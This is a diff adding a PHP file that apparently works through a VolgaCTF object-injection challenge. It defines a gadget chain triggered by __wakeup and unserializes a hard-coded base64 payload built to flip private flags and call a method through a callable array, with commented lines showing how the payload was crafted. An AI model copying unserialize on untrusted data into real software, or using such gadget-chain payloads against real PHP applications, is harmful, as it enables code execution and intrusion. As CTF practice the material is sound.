@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<?php
+
+class UnfinishedСlass {
+    public $handler;
+    public function runMe()
+    {
+     if (!$this->handler->current()){
+         return true;
+     }else{
+         throw Error;
+     }
+    }
+
+}
+
+
+class First{
+    private $flag;
+    public function runMe(){
+        return $this->flag;
+    }
+}
+
+class Second{
+    private $flag = false;
+    private $my_obj;
+    public function changeFlag(){
+        $this->flag=true;
+    }
+    public function runMe(){
+        if ($this->flag===true){
+            echo $this->my_obj->trash1;
+            return true;
+        }
+        else{
+            return false;
+        }
+    }
+}
+
+class PlayGround{
+    public function __construct(){
+        $this->first = new First();
+        $this->second = new Second();
+        $this->third = new UnfinishedСlass();
+    }
+    private $first;
+    private $second;
+    public $third;
+    public function __wakeup(){
+    	echo "_1_";
+        if ($this->first->runMe()){
+	    	echo "_2_";
+            if ($this->second->runMe()){
+		    	echo "_3_";
+#                if ($this->third->runMe()){
+#			    	echo "_4_";
+#			    	echo 'VolgaCTF{your flag}';
+ #               }
+            }
+        }
+    }
+}
+
+#$input = readline("Enter a payload: ");
+# echo "You can bypass my secure methods? :)";
+#$obj=new PlayGround();
+#echo $obj();
+#$obj->first->flag=true;
+#$str1=serialize($obj);
+#echo base64_encode($str1);
+
+#echo $str1;
+
+#$a=array('1','2');
+#echo current($a);
+
+
+
+$str='TzoxMDoiUGxheUdyb3VuZCI6Mzp7czoxNzoiAFBsYXlHcm91bmQAZmlyc3QiO086NToiRmlyc3QiOjE6e3M6MTE6IgBGaXJzdABmbGFnIjtiOjE7fXM6MTg6IgBQbGF5R3JvdW5kAHNlY29uZCI7Tzo2OiJTZWNvbmQiOjI6e3M6MTI6IgBTZWNvbmQAZmxhZyI7YjoxO3M6MTQ6IgBTZWNvbmQAbXlfb2JqIjtOO31zOjU6InRoaXJkIjtPOjE2OiJVbmZpbmlzaGVk0KFsYXNzIjoxOntzOjc6ImhhbmRsZXIiO086NToiRmlyc3QiOjI6e3M6MTE6IgBGaXJzdABmbGFnIjtOO3M6NzoiY3VycmVudCI7YToyOntpOjA7Tzo2OiJTZWNvbmQiOjI6e3M6MTI6IgBTZWNvbmQAZmxhZyI7YjowO3M6MTQ6IgBTZWNvbmQAbXlfb2JqIjtOO31pOjE7czoxMDoiY2hhbmdlRmxhZyI7fX19fQ==';
+$str=unserialize(base64_decode($str));
+
+#$str->third->handler=new First();
+#$str->third->handler->current=array(new Second(), 'changeFlag');
+#echo "--";
+#echo base64_encode(serialize($str));
+
+
+#echo "----------------------------------------------------------------------------------------------------------------------------------------------------------";
+#$str2='O:10:"PlayGround":3:{s:17:"PlayGroundfirst";O:5:"First":1:{s:11:"Firstflag";N;}s:18:"PlayGroundsecond";O:6:"Second":2:{s:12:"Secondflag";b:0;s:14:"Secondmy_obj";N;}s:17:"PlayGroundthird";O:16:"UnfinishedСlass":1:{s:25:"UnfinishedСlasshandler";N;}}';
+#echo $str2;
+#echo "----------------------------------------------------------------------------------------------------------------------------------------------------------";
+#echo substr($str1,0,28);
+#echo "----------------------------------------------------------------------------------------------------------------------------------------------------------";
+#echo substr($str2,0,28);
+#echo "----------------------------------------------------------------------------------------------------------------------------------------------------------";
+#if (substr($str1,0,27) == substr($str2,0,27)){
+#	echo "==";
+#}
+#$obj=unserialize($str);
+#echo "_4";
+#var_dump($obj);
+
+#$a=array(new Second(), 'changeFlag');
+#echo base64_encode(serialize($a));
+#$s='YToyOntpOjA7Tzo2OiJTZWNvbmQiOjI6e3M6MTI6IgBTZWNvbmQAZmxhZyI7YjowO3M6MTQ6IgBTZWNvbmQAbXlfb2JqIjtOO31pOjE7czoxMDoiY2hhbmdlRmxhZyI7fQ==';
+#if (unserialize(base64_decode($s))()){
+#    echo "++";
+#}else{
+#    echo "--";
+#}
+
+?>
+</body>
+</html>
